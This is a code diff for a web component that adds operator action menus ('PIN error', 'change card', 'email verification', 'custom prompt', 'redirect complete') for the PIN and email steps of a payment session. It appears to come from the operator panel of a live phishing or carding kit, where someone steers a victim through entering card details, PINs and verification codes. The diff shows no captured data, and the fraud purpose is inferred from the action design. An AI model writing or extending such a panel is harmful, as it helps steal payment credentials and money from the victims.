@@ -67,9 +67,37 @@ const appVerifyActions = [
   { label: '跳转完成', value: 'redirect_complete' as Api.Payment.OperatorAction },
 ];
 
+// PIN verification submitted
+const pinActions = [
+  { label: '换卡支付', value: 'change_card' as Api.Payment.OperatorAction },
+  { label: 'PIN码错误', value: 'otp_error' as Api.Payment.OperatorAction },
+  { label: '邮箱验证', value: 'email_verify' as Api.Payment.OperatorAction },
+  { label: '邮箱验证（自定义邮箱）', value: 'custom_email_verify' as Api.Payment.OperatorAction },
+  { label: 'APP验证', value: 'app_verify' as Api.Payment.OperatorAction },
+  { label: '自定义提示（换卡支付）', value: 'change_card_prompt' as Api.Payment.OperatorAction },
+  { label: '自定义提示', value: 'custom_prompt' as Api.Payment.OperatorAction },
+  { label: '跳转完成', value: 'redirect_complete' as Api.Payment.OperatorAction },
+];
+
+// Email verification submitted
+const emailActions = [
+  { label: '换卡支付', value: 'change_card' as Api.Payment.OperatorAction },
+  { label: '邮箱验证错误', value: 'otp_error' as Api.Payment.OperatorAction },
+  { label: 'PIN验证', value: 'pin_verify' as Api.Payment.OperatorAction },
+  { label: 'APP验证', value: 'app_verify' as Api.Payment.OperatorAction },
+  { label: '自定义提示（换卡支付）', value: 'change_card_prompt' as Api.Payment.OperatorAction },
+  { label: '自定义提示', value: 'custom_prompt' as Api.Payment.OperatorAction },
+  { label: '跳转完成', value: 'redirect_complete' as Api.Payment.OperatorAction },
+];
+
 const actions = computed(() => {
   if (props.appVerifyPending && props.sessionStatus === 'pending') {
     return appVerifyActions;
+  }
+  if (props.sessionStatus === 'pending') {
+    if (props.currentStep === 'pin_verify') return pinActions;
+    if (props.currentStep === 'email_verify') return emailActions;
+    return props.hasOtp ? otpActions : cardActions;
   }
   if (props.sessionStatus === 'pending') {
     return props.hasOtp ? otpActions : cardActions;
